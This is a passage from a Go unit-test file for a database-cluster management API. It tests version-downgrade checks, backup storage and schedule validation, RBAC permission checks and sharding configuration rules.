			err:        errDBEngineDowngrade,
		},
		{
			name:       "valid upgrade",
			oldVersion: "8.0.22",
			newVersion: "8.0.23",
			err:        nil,
		},
		{
			name:       "valid upgrade (with 'v' prefix)",
			oldVersion: "v8.0.22",
			newVersion: "v8.0.23",
			err:        nil,
		},
		{
			name:       "major version downgrade",
			oldVersion: "16.1",
			newVersion: "15.5",
			err:        errDBEngineDowngrade,
		},
	}
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := validateDBEngineVersionUpgrade(tc.newVersion, tc.oldVersion)
			assert.ErrorIs(t, err, tc.err)
		})
	}
}

func TestCheckStorageDuplicates(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		cluster []byte
		err     error
	}{
		{
			name:    "ok: no schedules no backups",
			cluster: []byte(`{}`),
			err:     nil,
		},
		{
			name:    "ok: no duplicated storages",
			cluster: []byte(`{"spec":{"backup":{"schedules":[{"backupStorageName":"bs1"},{"backupStorageName":"bs2"}]}}}`),
			err:     nil,
		},
		{
			name:    "error duplicated storage",
			cluster: []byte(`{"spec":{"backup":{"schedules":[{"backupStorageName":"bs1"},{"backupStorageName":"bs2"},{"backupStorageName":"bs1"}]}}}`),
			err:     errDuplicatedStoragePG,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			db := &DatabaseCluster{}
			err := json.Unmarshal(tc.cluster, db)
			require.NoError(t, err)
			err = checkStorageDuplicates(*db)
			if tc.err == nil {
				require.NoError(t, err)
				return
			}
			require.Error(t, err)
			assert.Equal(t, tc.err.Error(), err.Error())
		})
	}
}

func TestCheckSchedulesChanges(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name       string
		oldCluster []byte
		newCluster []byte
		err        error
	}{
		{
			name:       "ok: no schedules no backups",
			oldCluster: []byte(`{}`),
			newCluster: []byte(`{}`),
			err:        nil,
		},
		{
			name:       "ok: added storage",
			oldCluster: []byte(`{"spec":{"backup":{"schedules":[{"name":"A", "backupStorageName":"bs1"}]}}}`),
			newCluster: []byte(`{"spec":{"backup":{"schedules":[{"name":"A", "backupStorageName":"bs1"}, {"name":"B", "backupStorageName":"bs2"}]}}}`),
			err:        nil,
		},
		{
			name:       "ok: deleted storage",
			oldCluster: []byte(`{"spec":{"backup":{"schedules":[{"name":"A","backupStorageName":"bs1"},{"name":"B", "backupStorageName":"bs2"}]}}}`),
			newCluster: []byte(`{"spec":{"backup":{"schedules":[{"name":"A","backupStorageName":"bs1"}]}}}`),
			err:        nil,
		},
		{
			name:       "ok: deleted storage and new added",
			oldCluster: []byte(`{"spec":{"backup":{"schedules":[{"name":"A", "backupStorageName":"bs1"},{"name": "B", "backupStorageName":"bs2"}]}}}`),
			newCluster: []byte(`{"spec":{"backup":{"schedules":[{"name":"A", "backupStorageName":"bs1"},{"name": "C", "backupStorageName":"bs2"}]}}}`),
			err:        nil,
		},
		{
			name:       "error: edited storage",
			oldCluster: []byte(`{"spec":{"backup":{"schedules":[{"name":"A", "backupStorageName":"bs1"},{"name": "B", "backupStorageName":"bs2"}]}}}`),
			newCluster: []byte(`{"spec":{"backup":{"schedules":[{"name":"A", "backupStorageName":"bs1"},{"name": "B", "backupStorageName":"bs3"}]}}}`),
			err:        errStorageChangePG,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			newDB := &DatabaseCluster{}
			err := json.Unmarshal(tc.newCluster, newDB)
			require.NoError(t, err)
			oldDB := &everestv1alpha1.DatabaseCluster{}
			err = json.Unmarshal(tc.oldCluster, oldDB)
			require.NoError(t, err)
			err = checkSchedulesChanges(*oldDB, *newDB)
			if tc.err == nil {
				require.NoError(t, err)
				return
			}
			require.Error(t, err)
			assert.Equal(t, tc.err.Error(), err.Error())
		})
	}
}

func TestValidateDuplicateStorageByUpdate(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name               string
		storages           []byte
		currentStorage     []byte
		currentStorageName string
		params             UpdateBackupStorageParams
		isDuplicate        bool
	}{
		{
			name:               "another storage with the same 3 params",
			currentStorage:     []byte(`{"spec":  {"name": "storageA", "bucket": "bucket2", "region": "region2", "endpointURL":"url2" }}`),
			storages:           []byte(`{"items": [{"spec":  {"name": "storageB", "bucket": "bucket1", "region": "region1", "endpointURL":"url1" }}]}`),
			currentStorageName: "storageA",
			params:             UpdateBackupStorageParams{Url: pointer.ToString("url1"), BucketName: pointer.ToString("bucket1"), Region: pointer.ToString("region1")},
			isDuplicate:        true,
		},
		{
			name:               "change of url will lead to duplication",
			currentStorage:     []byte(`{"spec":  {"name": "storageA", "bucket": "bucket2", "region": "region2", "endpointURL":"url2" }}`),
			storages:           []byte(`{"items": [{"spec":  {"name": "storageB", "bucket": "bucket2", "region": "region2", "endpointURL":"url1" }}]}`),
			currentStorageName: "storageA",
			params:             UpdateBackupStorageParams{Url: pointer.ToString("url1")},
			isDuplicate:        true,
		},
		{
			name:               "change of bucket will lead to duplication",
			currentStorage:     []byte(`{"spec":  {"name": "storageA", "bucket": "bucket2", "region": "region2", "endpointURL":"url2" }}`),
			storages:           []byte(`{"items": [{"spec":  {"name": "storageB", "bucket": "bucket1", "region": "region2", "endpointURL":"url2" }}]}`),
			currentStorageName: "storageA",
			params:             UpdateBackupStorageParams{BucketName: pointer.ToString("bucket1")},
			isDuplicate:        true,
		},
		{
			name:               "change of region will lead to duplication",
			currentStorage:     []byte(`{"spec":  {"name": "storageA", "bucket": "bucket2", "region": "region2", "endpointURL":"url2" }}`),
			storages:           []byte(`{"items": [{"spec":  {"name": "storageB", "bucket": "bucket2", "region": "region1", "endpointURL":"url2" }}]}`),
			currentStorageName: "storageA",
			params:             UpdateBackupStorageParams{Region: pointer.ToString("region1")},
			isDuplicate:        true,
		},
		{
			name:               "change of region and bucket will lead to duplication",
			currentStorage:     []byte(`{"spec":  {"name": "storageA", "bucket": "bucket2", "region": "region2", "endpointURL":"url2" }}`),
			storages:           []byte(`{"items": [{"spec":  {"name": "storageB", "bucket": "bucket1", "region": "region1", "endpointURL":"url2" }}]}`),
			currentStorageName: "storageA",
			params:             UpdateBackupStorageParams{Region: pointer.ToString("region1"), BucketName: pointer.ToString("bucket1")},
			isDuplicate:        true,
		},
		{
			name:               "no other storages: no duplictation",
			currentStorage:     []byte(`{"spec":  {"name": "storageA", "bucket": "bucket2", "region": "region2", "endpointURL":"url2" }}`),
			storages:           []byte(`{"items": [{"spec":  {"name": "storageA", "bucket": "bucket2", "region": "region2", "endpointURL":"url2" }}]}`),
			currentStorageName: "storageA",
			params:             UpdateBackupStorageParams{Url: pointer.ToString("url1"), BucketName: pointer.ToString("bucket1"), Region: pointer.ToString("region1")},
			isDuplicate:        false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			storages := &everestv1alpha1.BackupStorageList{}
			err := json.Unmarshal(tc.storages, storages)
			require.NoError(t, err)
			currentStorage := &everestv1alpha1.BackupStorage{}
			err = json.Unmarshal(tc.currentStorage, currentStorage)
			require.NoError(t, err)
			isDuplicate := validateDuplicateStorageByUpdate(tc.currentStorageName, currentStorage, storages, tc.params)
			assert.Equal(t, tc.isDuplicate, isDuplicate)
		})
	}
}

func TestValidateBackupSchedulesUpdate(t *testing.T) {
	t.Parallel()
	cases := []struct {
		desc           string
		canTakeBackups bool
		expected       error
		updated        []byte
		old            *everestv1alpha1.DatabaseCluster
	}{
		{
			desc:           "schedules not updated and no permission",
			canTakeBackups: false,
			updated:        []byte(`{"spec": {"backup": {"schedules": [{"name": "test-1","enabled": true,"backupStorageName": "storage-1","schedule": "0 1 * * *"}]}}}`),
			old: &everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{Namespace: "test-ns"},
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Name:              "test-1",
								Enabled:           true,
								BackupStorageName: "storage-1",
								Schedule:          "0 1 * * *",
							},
						},
					},
				},
			},
			expected: nil,
		},
		{
			desc:           "schedules updated and no permission",
			canTakeBackups: false,
			updated:        []byte(`{"spec": {"backup": {"schedules": [{"name": "test-1","enabled": true,"backupStorageName": "storage-1","schedule": "0 3 * * *"}]}}}`),
			old: &everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{Namespace: "test-ns"},
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Name:              "test-1",
								Enabled:           true,
								BackupStorageName: "storage-1",
								Schedule:          "0 1 * * *",
							},
						},
					},
				},
			},
			expected: errInsufficientPermissions,
		},
		{
			desc:           "schedules updated with permission",
			canTakeBackups: true,
			updated:        []byte(`{"spec": {"backup": {"schedules": [{"name": "test-1","enabled": true,"backupStorageName": "storage-1","schedule": "0 3 * * *"}]}}}`),
			old: &everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{Namespace: "test-ns"},
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Name:              "test-1",
								Enabled:           true,
								BackupStorageName: "storage-1",
								Schedule:          "0 1 * * *",
							},
						},
					},
				},
			},
			expected: nil,
		},
	}

	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			t.Parallel()

			// Setup mock.
			e := &EverestServer{
				l: zap.NewNop().Sugar(),
			}
			enforcer := &mocks.IEnforcer{}
			enforcer.On("Enforce",
				"user", rbac.ResourceDatabaseClusterBackups, rbac.ActionCreate, "test-ns/",
			).Return(tc.canTakeBackups, nil)
			enforcer.On("Enforce",
				"user", rbac.ResourceBackupStorages, rbac.ActionRead, mock.Anything,
			).Return(true, nil)
			e.rbacEnforcer = enforcer

			updated := &DatabaseCluster{}
			err := json.Unmarshal(tc.updated, updated)
			require.NoError(t, err)

			err = e.validateBackupScheduledUpdate("user", updated, tc.old)
			assert.ErrorIs(t, err, tc.expected)
		})
	}
}

func TestValidateShardingOnUpdate(t *testing.T) {
	t.Parallel()
	cases := []struct {
		desc     string
		expected error
		updated  []byte
		old      *everestv1alpha1.DatabaseCluster
	}{
		{
			desc:    "disabled",
			updated: []byte(`{"spec": {}}`),
			old: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: false,
					},
				},
			},
			expected: nil,
		},
		{
			desc:    "try to disable - no sharding section",
			updated: []byte(`{"spec": {}}`),
			old: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
					},
				},
			},
			expected: errDisableShardingNotSupported,
		},
		{
			desc:    "try to disable - enabled false",
			updated: []byte(`{"spec": {"sharding": {"enabled": false}}}`),
			old: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
					},
				},
			},
			expected: errDisableShardingNotSupported,
		},
		{
			desc:    "try to enable - if there was no sharding section",
			updated: []byte(`{"spec": {"sharding": {"enabled": true, "shards":3, "configServer": {"replicas": 2}}}}`),
			old: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{},
			},
			expected: errShardingEnablingNotSupported,
		},
		{
			desc:    "try to enable - if sharding 'enabled' was false",
			updated: []byte(`{"spec": {"sharding": {"enabled": true, "shards":3, "configServer": {"replicas": 2}}}}`),
			old: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: false,
					},
				},
			},
			expected: errShardingEnablingNotSupported,
		},
		{
			desc:    "ok",
			updated: []byte(`{"spec": {"engine": {"type": "psmdb", "version": "1.17.0"}, "sharding": {"enabled": true, "shards":5, "configServer": {"replicas": 3}}}}`),
			old: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
						ConfigServer: everestv1alpha1.ConfigServer{
							Replicas: 3,
						},
						Shards: 5,
					},
				},
			},
			expected: nil,
		},
	}

	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			t.Parallel()

			dbc := &DatabaseCluster{}
			err := json.Unmarshal(tc.updated, dbc)
			require.NoError(t, err)

			err = validateShardingOnUpdate(dbc, tc.old)
			assert.ErrorIs(t, err, tc.expected)
		})
	}
}

func TestValidateSharding(t *testing.T) {
	t.Parallel()
	cases := []struct {
		desc     string
		expected error
		cluster  []byte
	}{
		{
			desc:     "old psmdb version",
			cluster:  []byte(`{"spec": {"engine": {"type": "psmdb", "version": "1.15.0"}, "sharding": {"enabled": true, "shards":5, "configServer": {"replicas": 3}}}}`),
			expected: errShardingVersion,
		},
		{
			desc:     "pxc - not supported",
			cluster:  []byte(`{"spec": {"engine": {"type": "pxc"}, "sharding": {"enabled": true}}}`),
			expected: errShardingIsNotSupported,
		},
		{
			desc:     "pg - not supported",
			cluster:  []byte(`{"spec": {"engine": {"type": "pg"}, "sharding": {"enabled": true}}}`),
			expected: errShardingIsNotSupported,
		},
		{
			desc:     "even configservers",
			cluster:  []byte(`{"spec": {"engine": {"type": "psmdb", "version": "1.17.0"}, "sharding": {"enabled": true, "shards": 1, "configServer": {"replicas": 4}}}}`),
			expected: errEvenServersNumber,
		},
		{
			desc:     "insufficient configservers",
			cluster:  []byte(`{"spec": {"engine": {"type": "psmdb", "version": "1.17.0", "replicas": 3}, "sharding": {"enabled": true, "shards": 1,"configServer": {"replicas": 1}}}}`),
			expected: errInsufficientCfgSrvNumber,
		},
		{
			desc:     "insufficient configservers 1 node",
			cluster:  []byte(`{"spec": {"engine": {"type": "psmdb", "version": "1.17.0", "replicas": 1}, "sharding": {"enabled": true, "shards": 1,"configServer": {"replicas": 0}}}}`),
			expected: errInsufficientCfgSrvNumber1Node,
		},
		{
			desc:     "insufficient shards number",
			cluster:  []byte(`{"spec": {"engine": {"type": "psmdb", "version": "1.17.0"},"sharding": {"enabled": true, "shards": 0, "configServer": {"replicas": 3}}}}`),
			expected: errInsufficientShardsNumber,
		},
		{
			desc:     "ok",
			cluster:  []byte(`{"spec": {"engine": {"type": "psmdb", "version": "1.17.0"}, "sharding": {"enabled": true, "shards": 1, "configServer": {"replicas": 3}}}}`),
			expected: nil,
		},
	}

	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			t.Parallel()

			dbc := &DatabaseCluster{}
			err := json.Unmarshal(tc.cluster, dbc)
			require.NoError(t, err)

			err = validateSharding(*dbc)
			assert.ErrorIs(t, err, tc.expected)
		})
	}
}
